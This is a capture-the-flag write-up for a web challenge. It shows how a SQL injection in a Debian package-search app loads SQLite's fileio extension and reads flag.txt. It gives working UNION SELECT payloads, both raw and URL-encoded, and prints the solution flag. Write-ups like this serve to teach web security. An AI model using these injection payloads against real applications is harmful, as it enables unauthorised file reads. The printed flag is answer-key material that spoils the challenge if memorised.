# Challenge Name: packages

## Description

Explore the world of debian/debian-based packages.

**Challenge URL:** `https://packages.challs.pwnoh.io`

---

## Writeup

### Step 1: Understanding the Application

The application appears to be a package search interface that queries a SQLite database for Debian package information. It takes parameters:
- `distro` - Distribution name
- `package` - Package name

### Step 2: Identifying SQL Injection

The application is vulnerable to **SQL Injection** in the `package` parameter. We can inject SQL code to:
1. Load SQLite extensions
2. Read files from the filesystem

### Step 3: Finding SQLite Version

First, we need to determine the SQLite version to know which extensions are available. The version is `3.46.1`.

### Step 4: Loading File I/O Extension

SQLite can load extensions that provide additional functions. We can load the `fileio.so` extension to read files:

```
?distro=&package=" UNION SELECT load_extension('/sqlite/ext/misc/fileio.so'), '', '', '' --
```

This loads the file I/O extension.

### Step 5: Reading the Flag

Once the extension is loaded, we can use `readfile()` function to read `flag.txt`:

```
?distro=&package=" UNION SELECT readfile('flag.txt'), '', '', '' --
```

### Step 6: URL Encoding

The payloads need to be URL encoded:
- First payload: `https://packages.challs.pwnoh.io/?distro=&package=%22+UNION+SELECT+load_extension%28%27%2Fsqlite%2Fext%2Fmisc%2Ffileio.so%27%29%2C+%27%27%2C+%27%27%2C+%27%27+--`
- Second payload: `https://packages.challs.pwnoh.io/?distro=&package=%22+UNION+SELECT+readfile%28%27flag.txt%27%29%2C+%27%27%2C+%27%27%2C+%27%27+--`

---

## Flag

```
bctf{y0uv3_g0t_4n_apt17ud3_f0r_7h15}
```

---

